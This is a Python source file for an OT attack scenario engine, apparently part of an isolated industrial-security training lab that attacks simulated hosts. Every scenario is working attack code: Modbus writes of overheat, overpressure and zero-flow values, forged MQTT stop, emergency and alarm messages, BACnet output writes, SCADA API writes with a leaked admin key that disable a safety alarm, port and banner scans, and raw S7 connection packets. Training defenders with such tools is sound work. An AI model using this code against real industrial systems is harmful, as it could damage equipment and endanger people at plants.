"""
engine.py — OT Attack Scenario Engine
Simulates realistic OT cyber attack scenarios for training.
FOR ISOLATED EDUCATIONAL USE ONLY — NEVER USE ON REAL SYSTEMS.

Attack scenarios:
1. Modbus register manipulation (writes to holding registers)
2. MQTT topic injection (publishing malicious commands)
3. BACnet object manipulation (writing to analog outputs)
4. SCADA API manipulation (unauthorized setpoint changes)
5. Reconnaissance scanning (port scans, service enumeration)
6. Process anomaly injection (gradual drift inducing alarm states)
"""
import json
import logging
import random
import time
import threading
import requests
import struct
import socket

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [attack] %(levelname)s: %(message)s",
)
log = logging.getLogger("attack_engine")

CONFIG = {
    "modbus_host": "simulators",
    "modbus_port": 5020,
    "mqtt_broker": "mosquitto",
    "mqtt_port": 1883,
    "webapi_url": "http://simulators:8082",
    "s7_host": "simulators",
    "s7_port": 8102,
    "enip_host": "simulators",
    "enip_port": 44818,
    "scenario_interval": 120,       # Seconds between scenario starts
    "attack_duration": 30,          # How long each attack lasts
    "cooldown_period": 60,          # Pause between attacks
}

EVENT_LOG = []


def log_event(scenario, details):
    event = {
        "timestamp": time.time(),
        "scenario": scenario,
        "details": details,
        "source": "attack-engine",
    }
    EVENT_LOG.append(event)
    log.info(f"[{scenario}] {json.dumps(details)}")


# ── Scenario 1: Modbus Register Manipulation ───────────────────
def scenario_modbus_manipulation():
    """Write malicious values to Modbus holding registers."""
    log.info("SCENARIO: Modbus Register Manipulation")

    try:
        from pymodbus.client import ModbusTcpClient

        client = ModbusTcpClient(CONFIG["modbus_host"], port=CONFIG["modbus_port"])
        if not client.connect():
            log.error("Modbus: connection failed")
            return

        target_registers = [0, 10, 40, 50]  # Temp, Pressure, Level, Flow
        malicious_values = [450, 720, 999, 0]  # Overheat, overpressure, overflow, no flow

        for reg, val in zip(target_registers, malicious_values):
            client.write_register(reg, val)
            log_event("modbus-manipulation", {
                "action": "write_register",
                "register": reg,
                "value": val,
                "expected_normal": 235 if reg == 0 else "varies",
            })
            time.sleep(1)

        client.close()
        log.info("Modbus manipulation complete")
    except Exception as e:
        log.error(f"Modbus scenario error: {e}")


# ── Scenario 2: MQTT Topic Injection ───────────────────────────
def scenario_mqtt_injection():
    """Publish malicious commands to MQTT command topics."""
    log.info("SCENARIO: MQTT Topic Injection")

    try:
        import paho.mqtt.client as mqtt

        client = mqtt.Client(client_id="attack-injector")
        client.connect(CONFIG["mqtt_broker"], CONFIG["mqtt_port"], 60)

        malicious_payloads = [
            ("ot/plant1/cmd/pump/stop", {"command": "STOP", "reason": "emergency_fake"}),
            ("ot/plant1/cmd/valve/set", {"position": 0, "force": True}),
            ("ot/plant1/cmd/emergency/stop", {"activate": True}),
            ("ot/plant1/cmd/setpoint/temperature", {"value": 500, "source": "unauthorized"}),
            ("ot/plant1/cmd/pump/start", {"command": "START", "speed": 3600}),
        ]

        for topic, payload in malicious_payloads:
            client.publish(topic, json.dumps(payload), qos=1)
            log_event("mqtt-injection", {
                "action": "publish",
                "topic": topic,
                "payload": payload,
            })
            time.sleep(0.5)

        # Subscribe to telemetry to observe
        client.publish("ot/plant1/alarm/high_temperature", json.dumps({
            "alarm": True, "value": 480, "threshold": 400, "source": "attack",
        }))
        time.sleep(0.5)
        client.publish("ot/plant1/alarm/emergency", json.dumps({
            "alarm": True, "message": "EMERGENCY SHUTDOWN INITIATED",
        }))

        client.disconnect()
        log.info("MQTT injection complete")
    except Exception as e:
        log.error(f"MQTT scenario error: {e}")


# ── Scenario 3: BACnet Object Manipulation ─────────────────────
def scenario_bacnet_manipulation():
    """Write to BACnet analog outputs via the HTTP fallback."""
    log.info("SCENARIO: BACnet Object Manipulation")

    try:
        # Use HTTP fallback
        targets = [
            ("analogOutput", 0, 100.0),   # Damper to 100%
            ("analogOutput", 1, 60.0),    # Fan speed to 60Hz
            ("analogOutput", 2, 0.0),     # Valve closed
            ("binaryOutput", 0, False),   # AHU stop
        ]

        for obj_type, instance, value in targets:
            try:
                resp = requests.post(
                    f"http://{CONFIG['modbus_host']}:8083/bacnet/write/{obj_type}/{instance}",
                    json={"value": value},
                    timeout=5,
                )
                log_event("bacnet-manipulation", {
                    "action": "write",
                    "object": f"{obj_type}:{instance}",
                    "value": value,
                    "response": resp.status_code,
                })
            except requests.RequestException:
                log.warning("BACnet HTTP write failed (expected if no fallback)")

        log.info("BACnet manipulation complete")
    except Exception as e:
        log.error(f"BACnet scenario error: {e}")


# ── Scenario 4: SCADA API Manipulation ─────────────────────────
def scenario_scada_api_attack():
    """Target the SCADA REST API with malicious writes."""
    log.info("SCENARIO: SCADA API Manipulation")

    try:
        api_base = CONFIG["webapi_url"]

        # Read current state first
        resp = requests.get(f"{api_base}/api/v1/status", timeout=5)
        log_event("scada-api-recon", {
            "action": "status_check",
            "response": resp.json(),
        })

        # Malicious writes
        malicious_writes = [
            ("reactor.temperature", 480),
            ("reactor.pressure", 72),
            ("piping.valve_position", 0),
            ("pump.speed", 3600),
            ("safety.alarm_active", False),
        ]

        for point, value in malicious_writes:
            try:
                resp = requests.post(
                    f"{api_base}/api/v1/write/{point}",
                    json={"value": value},
                    headers={"X-API-Key": "leaked-admin-key"},
                    timeout=5,
                )
                log_event("scada-api-write", {
                    "action": "write",
                    "point": point,
                    "value": value,
                    "response_code": resp.status_code,
                })
            except requests.RequestException as e:
                log.warning(f"SCADA API write failed: {e}")

        log.info("SCADA API attack complete")
    except Exception as e:
        log.error(f"SCADA scenario error: {e}")


# ── Scenario 5: Reconnaissance Scanning ────────────────────────
def scenario_recon_scanning():
    """Simulate reconnaissance activity against OT devices."""
    log.info("SCENARIO: Reconnaissance Scanning")

    targets_ports = [
        ("simulators", [5020, 4840, 8082, 8102, 44818, 9099]),
        ("mosquitto", [1883, 9001]),
    ]

    for host, ports in targets_ports:
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((host, port))
                s.close()
                log_event("recon-scan", {
                    "action": "port_scan",
                    "target": f"{host}:{port}",
                    "state": "open" if result == 0 else "closed",
                })
            except Exception:
                pass
            time.sleep(0.2)

    # Service banner grabbing simulation
    service_probes = [
        ("simulators", 5020, b"\x00\x01\x00\x00\x00\x00\x00\x0e\x01\x00\x00\x00\x00\x00"),
        ("simulators", 4840, b"HEL F"),
    ]

    for host, port, probe in service_probes:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((host, port))
            s.send(probe)
            resp = s.recv(1024)
            log_event("recon-banner", {
                "action": "banner_grab",
                "target": f"{host}:{port}",
                "response_size": len(resp),
                "response_hex": resp[:20].hex(),
            })
            s.close()
        except Exception:
            pass

    log.info("Recon scanning complete")


# ── Scenario 6: Process Anomaly Injection ──────────────────────
def scenario_process_anomaly():
    """Inject gradual process anomalies through multiple channels."""
    log.info("SCENARIO: Process Anomaly Injection")

    try:
        from pymodbus.client import ModbusTcpClient

        client = ModbusTcpClient(CONFIG["modbus_host"], port=CONFIG["modbus_port"])
        if client.connect():
            # Gradual temperature increase (simulates heater stuck on)
            for step in range(5):
                temp_val = 300 + (step * 30)
                client.write_register(0, temp_val)
                log_event("process-anomaly", {
                    "action": "temperature_ramp",
                    "register": 0,
                    "value": temp_val,
                    "step": step + 1,
                    "type": "gradual_drift",
                })
                time.sleep(2)

            # Sudden pressure spike
            client.write_register(10, 680)
            log_event("process-anomaly", {
                "action": "pressure_spike",
                "register": 10,
                "value": 680,
                "type": "sudden_change",
            })
            time.sleep(1)

            # Flow rate drop to zero
            client.write_register(50, 0)
            log_event("process-anomaly", {
                "action": "flow_zero",
                "register": 50,
                "value": 0,
                "type": "sudden_change",
            })

            client.close()

        # Also inject via MQTT
        try:
            import paho.mqtt.client as mqtt
            mc = mqtt.Client(client_id="anomaly-injector")
            mc.connect(CONFIG["mqtt_broker"], CONFIG["mqtt_port"], 60)
            mc.publish("ot/plant1/reactor/temperature", json.dumps({
                "value": 460, "unit": "C", "quality": "bad",
            }))
            mc.publish("ot/plant1/alarm/high_temperature", json.dumps({
                "alarm": True, "value": 460, "threshold": 400,
            }))
            mc.disconnect()
        except Exception:
            pass

        log.info("Process anomaly injection complete")
    except Exception as e:
        log.error(f"Anomaly scenario error: {e}")


# ── Scenario 7: Data Block Manipulation (S7) ───────────────────
def scenario_s7_manipulation():
    """Write malicious values to S7 data blocks."""
    log.info("SCENARIO: S7 Data Block Manipulation")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((CONFIG["s7_host"], CONFIG["s7_port"]))

        # Establish COTP + S7 connection
        s.send(bytes([
            0x03, 0x00, 0x00, 0x16,
            0x11, 0xE0, 0x00, 0x00, 0x00, 0x01,
            0x00, 0xC0, 0x01, 0x0A, 0xC0, 0x01, 0x0A, 0xC2, 0x02, 0x03, 0x00,
            0xC1, 0x02, 0x01, 0x00,
        ]))
        resp = s.recv(1024)
        log_event("s7-connect", {"action": "cotp_connect", "response_size": len(resp)})

        # Setup communication
        s.send(bytes([
            0x03, 0x00, 0x00, 0x1A,
            0x02, 0xF0, 0x80,
            0x32, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x08,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ]))
        resp = s.recv(1024)
        log_event("s7-setup", {"action": "s7_setup_comm", "response_size": len(resp)})

        s.close()
        log.info("S7 manipulation probes complete")
    except Exception as e:
        log.error(f"S7 scenario error: {e}")


SCENARIOS = [
    {"name": "Modbus Register Manipulation", "weight": 3, "func": scenario_modbus_manipulation},
    {"name": "MQTT Topic Injection", "weight": 3, "func": scenario_mqtt_injection},
    {"name": "BACnet Object Manipulation", "weight": 2, "func": scenario_bacnet_manipulation},
    {"name": "SCADA API Attack", "weight": 3, "func": scenario_scada_api_attack},
    {"name": "Reconnaissance Scanning", "weight": 2, "func": scenario_recon_scanning},
    {"name": "Process Anomaly Injection", "weight": 4, "func": scenario_process_anomaly},
    {"name": "S7 Data Block Manipulation", "weight": 2, "func": scenario_s7_manipulation},
]


def pick_scenario():
    """Weighted random scenario selection."""
    weights = [s["weight"] for s in SCENARIOS]
    return random.choices(SCENARIOS, weights=weights, k=1)[0]


def run_attack_cycle():
    """Run a single attack cycle."""
    scenario = pick_scenario()
    log.info(f"=== Starting attack scenario: {scenario['name']} ===")
    log_event("cycle-start", {"scenario": scenario["name"]})

    try:
        scenario["func"]()
    except Exception as e:
        log.error(f"Scenario {scenario['name']} failed: {e}")

    log.info(f"=== Scenario complete: {scenario['name']} ===")
    log_event("cycle-end", {"scenario": scenario["name"]})


def main():
    log.info("=" * 60)
    log.info("OT Attack Scenario Engine Starting")
    log.info("FOR ISOLATED EDUCATIONAL USE ONLY")
    log.info("=" * 60)

    initial_delay = 15  # Wait for simulators to be ready
    log.info(f"Initial delay: {initial_delay}s (waiting for simulators)")
    time.sleep(initial_delay)

    cycle_count = 0
    while True:
        cycle_count += 1
        log.info(f"\n{'='*40}\nAttack Cycle #{cycle_count}\n{'='*40}")

        run_attack_cycle()

        cooldown = CONFIG["cooldown_period"] + random.randint(0, 30)
        log.info(f"Cooldown: {cooldown}s before next scenario")
        time.sleep(cooldown)


if __name__ == "__main__":
    main()
